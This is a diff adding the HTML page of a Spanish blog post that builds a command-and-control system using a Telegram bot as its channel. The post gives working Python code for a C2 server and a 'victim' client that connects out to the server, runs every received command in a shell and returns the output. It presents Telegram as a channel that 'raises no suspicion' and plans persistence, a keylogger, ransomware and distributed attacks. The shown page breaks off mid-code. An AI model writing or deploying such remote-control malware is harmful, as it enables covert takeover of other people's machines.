@@ -1,0 +1,596 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Controlando bots con Telegram: así hice mi propio C2 | 17tay</title>
+<meta name="keywords" content="command-and-control, ciberseguridad, post, python">
+<meta name="description" content="Introdución En este post voy a explicar como desarrollé un sistema de Command and Control (C2) utilizando Telegram como canal de comunicaciones. La idea era tener algo desplegable desde cualquier dispositivo, que fuera discreto y que no dependiera de servidores caros o infraestructuras complejas, Entonces valoré dos opciones o Discord o Telegram, ya que la implementación de sus APIs es fácil de usar, al final me quedé con Telegram.
+¿Por qué Telegram?">
+<meta name="author" content="17tay">
+<link rel="canonical" href="http://localhost:1313/posts/post-c2-sobre-telegram/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/post-c2-sobre-telegram/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/js/all.min.js" crossorigin="anonymous"></script>
+
+  
+
+<meta property="og:url" content="http://localhost:1313/posts/post-c2-sobre-telegram/">
+  <meta property="og:site_name" content="17tay">
+  <meta property="og:title" content="Controlando bots con Telegram: así hice mi propio C2">
+  <meta property="og:description" content="Introdución En este post voy a explicar como desarrollé un sistema de Command and Control (C2) utilizando Telegram como canal de comunicaciones. La idea era tener algo desplegable desde cualquier dispositivo, que fuera discreto y que no dependiera de servidores caros o infraestructuras complejas, Entonces valoré dos opciones o Discord o Telegram, ya que la implementación de sus APIs es fácil de usar, al final me quedé con Telegram.
+¿Por qué Telegram?">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-03-25T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-03-25T00:00:00+00:00">
+    <meta property="article:tag" content="Command-and-Control">
+    <meta property="article:tag" content="Ciberseguridad">
+    <meta property="article:tag" content="Post">
+    <meta property="article:tag" content="Python">
+    <meta property="og:image" content="http://localhost:1313/images/C2_Over_Tg/esquema_c2.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://localhost:1313/images/C2_Over_Tg/esquema_c2.png">
+<meta name="twitter:title" content="Controlando bots con Telegram: así hice mi propio C2">
+<meta name="twitter:description" content="Introdución En este post voy a explicar como desarrollé un sistema de Command and Control (C2) utilizando Telegram como canal de comunicaciones. La idea era tener algo desplegable desde cualquier dispositivo, que fuera discreto y que no dependiera de servidores caros o infraestructuras complejas, Entonces valoré dos opciones o Discord o Telegram, ya que la implementación de sus APIs es fácil de usar, al final me quedé con Telegram.
+¿Por qué Telegram?">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "http://localhost:1313/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Controlando bots con Telegram: así hice mi propio C2",
+      "item": "http://localhost:1313/posts/post-c2-sobre-telegram/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Controlando bots con Telegram: así hice mi propio C2",
+  "name": "Controlando bots con Telegram: así hice mi propio C2",
+  "description": "Introdución En este post voy a explicar como desarrollé un sistema de Command and Control (C2) utilizando Telegram como canal de comunicaciones. La idea era tener algo desplegable desde cualquier dispositivo, que fuera discreto y que no dependiera de servidores caros o infraestructuras complejas, Entonces valoré dos opciones o Discord o Telegram, ya que la implementación de sus APIs es fácil de usar, al final me quedé con Telegram.\n¿Por qué Telegram?",
+  "keywords": [
+    "command-and-control", "ciberseguridad", "post", "python"
+  ],
+  "articleBody": "Introdución En este post voy a explicar como desarrollé un sistema de Command and Control (C2) utilizando Telegram como canal de comunicaciones. La idea era tener algo desplegable desde cualquier dispositivo, que fuera discreto y que no dependiera de servidores caros o infraestructuras complejas, Entonces valoré dos opciones o Discord o Telegram, ya que la implementación de sus APIs es fácil de usar, al final me quedé con Telegram.\n¿Por qué Telegram? Es gratuito\nTiene API pública\nNo levanta sospechas (todo el mundo lo usa).\nPuedes usar tanto bots, grupos o canales para interactuar\nBasicamente al usarlo como canal de C2 me evito tener que montar servidores web o gestionar dominios ya que me aprovecho de su infraestructura para enviar y recibir mensajes entre clientes\nSet-Up Antes de entrar en el desarrollo y la parte tecnica voy a explicar como crear tu propio bot, ver su token, crear el grupo y conseguir el chat ID para que asi puedas seguir el desarrollo conmigo\nCrear el bot Crear el bot es muy fácil solo tendremos que ir a telegram y buscar el usuario @BotFather, una vez estemos en el chat con él solo tendremos que escribir /newbot, nos pedira dos nombres, el primero sera el de usuario normal y el segundo sera el @ que tiene que acabar en bot, una vez le digamos los nombres nos dara el token del bot\nDespues de esto tendremos de cambiar un ajuste del bot, le escribiremos /mybots seleccionaremos el que acabmos de crear, después Bot settings, luego Group Privacy y le tendremos que dar a turn off\nAhora ya tendriamos el BOT creado\nCrear Grupo Crear el grupo es aun mas fácil, le daremos a New Group en el menu principal, le pondremos un nombre, el que sea y añadiremos a nuestro bot, una vez creado si miramos los miembros y en nuestro bot nos pone Has access to the messages esta todo bien configurado\nSolo nos faltara conseguir el chat ID, hay dos maneras\nAñadir un bot ya hecho que al ponerlo en el grupo te da la ID\nHacer que tu bot te mande el chat ID\nLa primera opción es la más fácil y el bot que yo uso para ver las IDs es @getidsbot, lo añades y te da el chat ID\nLa segunda opción es sencilla también este sería el codigo que tendriamos que ejecutar para que nuestro bot nos de la iD\nEste sería un codigo en python para hacer eso\nimport telebot TOKEN = \"El token del bot\" bot = telebot.TeleBot(TOKEN) @bot.message_handler(func=lambda message: True) def get_chat_id(message): chat_id = message.chat.id bot.reply_to(message, f\"🆔 Este es el chat ID: `{chat_id}`\", parse_mode=\"Markdown\") bot.polling() Ejecutamos el script y escribimos cualquier cosa en el grupo que queramos la ID\nAhora ya podemos pasar a la parte tecnica\nArquitectura general El C2 tiene dos componentes principales\nCliente (víctima): se conecta al servidor, espera ordenes, las ejecuta y devuelve los resultados\nServidor (C2): esta conectado a un grupo de Telegram, recibe comandos desde ahi y los distribuye a los agentes\nDesarrollo Aqui voy a relatar mas o menos como lo fui desarrollando poco a poco\nPrimeros pasos Empecé definiendo la estructura básica del proyecto: era un cliente que se conecta a un servidor mediante sockets. El servidor a la vez esta conectado a un grupo de telegram mediante un bot que escucha comandos enviados en el grupo y los dirije a los clientes\nEsquema de la estructura: Esta sería un poco la estructura mas básica del servidor:\nServidor: import socket import threading import telebot # Configuración del bot de Telegram y del servidor C2 TOKEN = \"TOKEN_DEL_BOT_DE_TELEGRAM\" C2_CHANNEL_ID = \"ID_DEL_GRUPO_O_CANAL\" C2_SERVER_IP = \"0.0.0.0\" C2_SERVER_PORT = 9090 # Inicializamos el bot y la lista de clientes conectados bot = telebot.TeleBot(TOKEN) clients = [] # Función que controlara cada cliente en un hilo aparte def handle_client(client_socket): while True: try: pass # De momento no hace nada aquí, todo se controla desde Telegram except: # Si hay algun error, eliminamos al cliente y cerramos su socket clients.remove(client_socket) client_socket.close() break # Esto enciende el servidor TCP que esta en espera conexiones de clientes def start_server(): server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) server.bind((C2_SERVER_IP, C2_SERVER_PORT)) server.listen(5) print(f\"[+] Esperando conexiones en {C2_SERVER_IP}:{C2_SERVER_PORT}\") while True: client_socket, addr = server.accept() print(f\"[+] Nuevo cliente conectado: {addr}\") clients.append(client_socket) # Cada cliente es un hilo aparte por si llegan varios a la vez threading.Thread(target=handle_client, args=(client_socket,), daemon=True).start() # Cada vez que alguien escribe en el grupo esta función se ejecuta y procesa el mensaje @bot.message_handler(func=lambda m: True) def handle_telegram_command(message): command = message.text # Obtenemos el texto del mensaje como comando if not clients: bot.send_message(C2_CHANNEL_ID, \"[!] No hay clientes conectados.\") return for client in clients: try: client.send(command.encode()) # Enviamos el comando al cliente response = client.recv(4096).decode() # Esperamos su respuesta bot.send_message(C2_CHANNEL_ID, f\"[+] Respuesta del cliente:\\n{response}\") except Exception as e: bot.send_message(C2_CHANNEL_ID, f\"[!] Error con cliente: {e}\") # Lanzamos el servidor en segundo plano y arrancamos el bot threading.Thread(target=start_server, daemon=True).start() bot.polling() Cliente: import socket import subprocess # Configuración del servidor al que se conectará el cliente SERVER_IP = \"IP_DEL_SERVER\" SERVER_PORT = 9090 def connect_to_server(): # Creamos el socket y nos conectamos al servidor C2 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) client.connect((SERVER_IP, SERVER_PORT)) while True: try: # Esperamos un comando del servidor command = client.recv(4096).decode() if not command: break # Si no hay comando, se rompe el bucle # Ejecutamos el comando recibido en el sistema result = subprocess.getoutput(command) # Enviamos el resultado de vuelta al servidor client.send(result.encode()) except: break # Si hay cualquier error, salimos del bucle client.close() # Cerramos el socket si se sale del bucle # Llamamos a la función para iniciar la conexión connect_to_server() Ejemplo de chat con este código: Esta estructura es muy básica y ya me empecé a dar cuenta de muchas cosas que se tenian que mejorar como por ejemplo:\nCreacion de diferentes canales por cliente para asi poder tener multiples a la vez y poder tener un canal de comunicaciones privado con cada uno de ellos\nQue no fueran comandos directos sino que hubieran ya multiples funcionalidades definidas como (/screenshot /download…)\nCifrado fuerte de las comunicaciones para mayor seguridad y privacidad\nComandos globales a multiples clientes para poder lanzar quiza ataques distribuidos\nTambien queria pasar toda la estructura del servidor a POO con clases para hacer mas bonito y eficiente el codigo\nMejoras Bascicamente lo primero que hice fue pasar todo a POO creando dos clases principales en el servidor\nclass ClientSession: def __init__(self, socket, address): self.socket = socket self.address = address self.ip = address[0] self.username = None self.os_version = None self.topic_id = None def send_command(self, command): try: self.socket.send(command.encode(\"utf-8\")) response = self.socket.recv(4096).decode(\"utf-8\").strip() return response if response else \"[Sin respuesta]\" except Exception as e: return f\"[!] Error executing the command: {e}\" def close(self): try: self.socket.close() except Exception as e: print(f\"[!] Error closing the connection with {self.ip}: {e}\") class C2Server: def __init__(self): self.clients = {} self.active_shell_sessions = {} self.server = None signal.signal(signal.SIGINT, self.shutdown) self.init_db() def init_db(self): conn = sqlite3.connect(\"c2.db\") cursor = conn.cursor() cursor.execute('''CREATE TABLE IF NOT EXISTS clients ( id INTEGER PRIMARY KEY AUTOINCREMENT, telegram_id TEXT, ip TEXT, username TEXT, topic_id INTEGER)''') conn.commit() conn.close() La primera clase se encarga gestionar y almacenar los datos de lo que sería en si la sessión de cada cliente\nLa segunda clase sería donde primero inicializariamos la base de datos y luego definiriamos toda la logica y funciones de el servidor\nDespues fui desarrollando lo que sería una base mas solida y ordenada de el sistema\ndef start_server(self): self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) self.server.bind((C2_SERVER_IP, C2_SERVER_PORT)) self.server.listen(5) print(f\"[C2] Servidor esperando conexiones en {C2_SERVER_IP}:{C2_SERVER_PORT}...\") bot.send_message(C2_CHANNEL_ID, f\"🚀 C2 Server Started at {C2_SERVER_IP}:{C2_SERVER_PORT} 🚀\\n\", parse_mode=\"Markdown\") while True: try: client_socket, client_address = self.server.accept() print(f\"[+] New connection {client_address}\") client_thread = threading.Thread(target=self.handle_client, args=(client_socket, client_address), daemon=True) client_thread.start() except Exception as e: print(f\"[C2] Error with the connection: {e}\") Esta sería la función que se encarga de iniciar el servidor y de ponerse en espera de conexiones, a parte envia un mensaje al canal general del grupo para informar de que se ha iniciado\nPróximos pasos A partir de esta base fui mejorando el proyecto paso a paso: reestructurando el código, añadiendo nuevas funciones y centrándome sobre todo en hacerlo más estructurado y escalable. Lo que has visto aquí es solo el inicio, una especie de mínimo viable funcional.\nEn el repositorio de GitHub he dejado un roadmap con todas las mejoras que tengo previstas. Algunas de las más interesantes son:\nSistema de autenticación para agentes (con clave precompartida o firmas). Persistencia del agente en el sistema (registro, tareas programadas…). Registro completo de los comandos ejecutados. Agrupación de bots por etiquetas (OS, localización, etc). Agente multiplataforma (Windows, Linux, MacOS). Funciones ofensivas avanzadas como keylogger, ransomware y control de webcam. Soporte para canales alternativos de C2 (Discord, API directa de Telegram…). Dashboard web opcional para gestionar bots y comandos en tiempo real. Y no, no es un proyecto que vaya a quedar tirado. Lo voy actualizando constantemente y me sirve tanto para aprender como para experimentar con ideas nuevas.\nEsto es solo la primera entrega.\nNos vemos en la siguiente 😈\n📬 ¿Tienes dudas, sugerencias o ideas para mejorar esto? Puedes abrir una issue o dejar un comentario en el repo. Me mola ver cómo otros lo enfocan.\n",
+  "wordCount" : "1526",
+  "inLanguage": "en",
+  "image":"http://localhost:1313/images/C2_Over_Tg/esquema_c2.png","datePublished": "2025-03-25T00:00:00Z",
+  "dateModified": "2025-03-25T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "17tay"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/posts/post-c2-sobre-telegram/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "17tay",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="17tay (Alt + H)">17tay</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/categories/" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Controlando bots con Telegram: así hice mi propio C2
+    </h1>
+    <div class="post-meta"><span title='2025-03-25 00:00:00 +0000 UTC'>March 25, 2025</span>&nbsp;·&nbsp;8 min&nbsp;·&nbsp;1526 words&nbsp;·&nbsp;17tay
+
+</div>
+  </header> 
+<figure class="entry-cover">
+        <img loading="eager" src="http://localhost:1313/images/C2_Over_Tg/esquema_c2.png" alt="Imagen del post">
+        
+</figure>
+  <div class="post-content"><h1 id="introdución">Introdución<a hidden class="anchor" aria-hidden="true" href="#introdución">#</a></h1>
+<p>En este post voy a explicar como desarrollé un sistema de <strong>Command and Control (C2)</strong> utilizando <strong>Telegram</strong> como canal de comunicaciones. La idea era tener algo desplegable desde cualquier dispositivo, que fuera discreto y que no dependiera de servidores caros o infraestructuras complejas, Entonces valoré dos opciones o <strong>Discord</strong> o <strong>Telegram</strong>, ya que la implementación de sus <strong>APIs</strong> es fácil de usar, al final me quedé con Telegram.</p>
+<h2 id="por-qué-telegram">¿Por qué Telegram?<a hidden class="anchor" aria-hidden="true" href="#por-qué-telegram">#</a></h2>
+<ul>
+<li>
+<p>Es gratuito</p>
+</li>
+<li>
+<p>Tiene API pública</p>
+</li>
+<li>
+<p>No levanta sospechas (todo el mundo lo usa).</p>
+</li>
+<li>
+<p>Puedes usar tanto bots, grupos o canales para interactuar</p>
+</li>
+</ul>
+<p>Basicamente al usarlo como canal de <strong>C2</strong> me evito tener que montar servidores web o gestionar dominios ya que me aprovecho de su infraestructura para enviar y recibir mensajes entre clientes</p>
+<hr>
+<h2 id="set-up">Set-Up<a hidden class="anchor" aria-hidden="true" href="#set-up">#</a></h2>
+<p>Antes de entrar en el desarrollo y la parte tecnica voy a explicar como crear <strong>tu propio bot</strong>, <strong>ver su token</strong>, <strong>crear el grupo</strong> y conseguir el <strong>chat ID</strong> para que asi puedas seguir el desarrollo conmigo</p>
+<h3 id="crear-el-bot">Crear el bot<a hidden class="anchor" aria-hidden="true" href="#crear-el-bot">#</a></h3>
+<p>Crear el bot es muy fácil solo tendremos que ir a telegram y buscar el usuario <strong>@BotFather</strong>, una vez estemos en el chat con él solo tendremos que escribir <strong>/newbot</strong>, nos pedira dos nombres, el primero sera el de usuario normal y el segundo sera el @ que tiene que acabar en bot, una vez le digamos los nombres nos dara el token del bot</p>
+<p><img alt="bot-father" loading="lazy" src="/images/C2_Over_Tg/chat_bot_father.png"></p>
+<p>Despues de esto tendremos de cambiar un ajuste del bot, le escribiremos <strong>/mybots</strong> seleccionaremos el que acabmos de crear, después <strong>Bot settings</strong>, luego <strong>Group Privacy</strong> y le tendremos que dar a <strong>turn off</strong></p>
+<p>Ahora ya tendriamos el BOT creado</p>
+<h3 id="crear-grupo">Crear Grupo<a hidden class="anchor" aria-hidden="true" href="#crear-grupo">#</a></h3>
+<p>Crear el grupo es aun mas fácil, le daremos a New Group en el menu principal, le pondremos un nombre, el que sea y añadiremos a nuestro bot, una vez creado si miramos los miembros y en nuestro bot nos pone <strong>Has access to the messages</strong> esta todo bien configurado</p>
+<p>Solo nos faltara conseguir el chat <strong>ID</strong>, hay dos maneras</p>
+<ul>
+<li>
+<p>Añadir un bot ya hecho que al ponerlo en el grupo te da la <strong>ID</strong></p>
+</li>
+<li>
+<p>Hacer que tu bot te mande el chat <strong>ID</strong></p>
+</li>
+</ul>
+<p>La <strong>primera opción</strong> es la más fácil y el bot que yo uso para ver las <strong>IDs</strong> es <strong>@getidsbot</strong>, lo añades y te da el chat ID</p>
+<p><img alt="idsbot" loading="lazy" src="/images/C2_Over_Tg/getidsbot.png"></p>
+<p>La <strong>segunda opción</strong> es sencilla también este sería el codigo que tendriamos que ejecutar para que nuestro bot nos de la iD</p>
+<p>Este sería un <strong>codigo en python</strong> para hacer eso</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> telebot
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>TOKEN <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;El token del bot&#34;</span>
+</span></span><span style="display:flex;"><span>bot <span style="color:#f92672">=</span> telebot<span style="color:#f92672">.</span>TeleBot(TOKEN)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@bot.message_handler</span>(func<span style="color:#f92672">=</span><span style="color:#66d9ef">lambda</span> message: <span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_chat_id</span>(message):
+</span></span><span style="display:flex;"><span>    chat_id <span style="color:#f92672">=</span> message<span style="color:#f92672">.</span>chat<span style="color:#f92672">.</span>id
+</span></span><span style="display:flex;"><span>    bot<span style="color:#f92672">.</span>reply_to(message, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;🆔 Este es el chat ID: `</span><span style="color:#e6db74">{</span>chat_id<span style="color:#e6db74">}</span><span style="color:#e6db74">`&#34;</span>, parse_mode<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Markdown&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>bot<span style="color:#f92672">.</span>polling()
+</span></span></code></pre></div><p>Ejecutamos el script y escribimos <strong>cualquier cosa</strong> en el grupo que queramos la <strong>ID</strong></p>
+<p><img alt="damelaid" loading="lazy" src="/images/C2_Over_Tg/damelaidperro.png"></p>
+<p><strong>Ahora ya podemos pasar a la parte tecnica</strong></p>
+<hr>
+<h2 id="arquitectura-general">Arquitectura general<a hidden class="anchor" aria-hidden="true" href="#arquitectura-general">#</a></h2>
+<p>El <strong>C2</strong> tiene dos componentes principales</p>
+<ul>
+<li>
+<p><strong>Cliente (víctima):</strong> se conecta al servidor, espera ordenes, las ejecuta y devuelve los resultados</p>
+</li>
+<li>
+<p><strong>Servidor (C2):</strong> esta conectado a un grupo de Telegram, recibe comandos desde ahi y los distribuye a los agentes</p>
+</li>
+</ul>
+<hr>
+<h2 id="desarrollo">Desarrollo<a hidden class="anchor" aria-hidden="true" href="#desarrollo">#</a></h2>
+<p>Aqui voy a relatar mas o menos como lo fui desarrollando poco a poco</p>
+<h3 id="primeros-pasos">Primeros pasos<a hidden class="anchor" aria-hidden="true" href="#primeros-pasos">#</a></h3>
+<p>Empecé definiendo la estructura básica del proyecto: era un <strong>cliente</strong> que se conecta a un <strong>servidor mediante sockets</strong>. El servidor a la vez esta conectado a un <strong>grupo de telegram mediante un bot</strong> que escucha comandos enviados en el grupo y los dirije a los clientes</p>
+<p><strong>Esquema de la estructura:</strong>
+<img alt="Esquma de C2" loading="lazy" src="/images/C2_Over_Tg/esquema_c2.png"></p>
+<p><strong>Esta sería un poco la estructura mas básica del servidor:</strong></p>
+<h4 id="servidor">Servidor:<a hidden class="anchor" aria-hidden="true" href="#servidor">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> threading
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> telebot
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Configuración del bot de Telegram y del servidor C2</span>
+</span></span><span style="display:flex;"><span>TOKEN <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;TOKEN_DEL_BOT_DE_TELEGRAM&#34;</span>
+</span></span><span style="display:flex;"><span>C2_CHANNEL_ID <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ID_DEL_GRUPO_O_CANAL&#34;</span>
+</span></span><span style="display:flex;"><span>C2_SERVER_IP <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0.0.0.0&#34;</span>
+</span></span><span style="display:flex;"><span>C2_SERVER_PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">9090</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Inicializamos el bot y la lista de clientes conectados</span>
+</span></span><span style="display:flex;"><span>bot <span style="color:#f92672">=</span> telebot<span style="color:#f92672">.</span>TeleBot(TOKEN)
+</span></span><span style="display:flex;"><span>clients <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Función que controlara cada cliente en un hilo aparte</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">handle_client</span>(client_socket):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">pass</span>  <span style="color:#75715e"># De momento no hace nada aquí, todo se controla desde Telegram</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># Si hay algun error, eliminamos al cliente y cerramos su socket</span>
+</span></span><span style="display:flex;"><span>            clients<span style="color:#f92672">.</span>remove(client_socket)
+</span></span><span style="display:flex;"><span>            client_socket<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Esto enciende el servidor TCP que esta en espera conexiones de clientes</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start_server</span>():
+</span></span><span style="display:flex;"><span>    server <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>    server<span style="color:#f92672">.</span>bind((C2_SERVER_IP, C2_SERVER_PORT))
+</span></span><span style="display:flex;"><span>    server<span style="color:#f92672">.</span>listen(<span style="color:#ae81ff">5</span>)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] Esperando conexiones en </span><span style="color:#e6db74">{</span>C2_SERVER_IP<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>C2_SERVER_PORT<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>        client_socket, addr <span style="color:#f92672">=</span> server<span style="color:#f92672">.</span>accept()
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] Nuevo cliente conectado: </span><span style="color:#e6db74">{</span>addr<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        clients<span style="color:#f92672">.</span>append(client_socket)
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Cada cliente es un hilo aparte por si llegan varios a la vez</span>
+</span></span><span style="display:flex;"><span>        threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>handle_client, args<span style="color:#f92672">=</span>(client_socket,), daemon<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)<span style="color:#f92672">.</span>start()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Cada vez que alguien escribe en el grupo esta función se ejecuta y procesa el mensaje</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@bot.message_handler</span>(func<span style="color:#f92672">=</span><span style="color:#66d9ef">lambda</span> m: <span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">handle_telegram_command</span>(message):
+</span></span><span style="display:flex;"><span>    command <span style="color:#f92672">=</span> message<span style="color:#f92672">.</span>text  <span style="color:#75715e"># Obtenemos el texto del mensaje como comando</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> clients:
+</span></span><span style="display:flex;"><span>        bot<span style="color:#f92672">.</span>send_message(C2_CHANNEL_ID, <span style="color:#e6db74">&#34;[!] No hay clientes conectados.&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> client <span style="color:#f92672">in</span> clients:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            client<span style="color:#f92672">.</span>send(command<span style="color:#f92672">.</span>encode())       <span style="color:#75715e"># Enviamos el comando al cliente</span>
+</span></span><span style="display:flex;"><span>            response <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>)<span style="color:#f92672">.</span>decode()  <span style="color:#75715e"># Esperamos su respuesta</span>
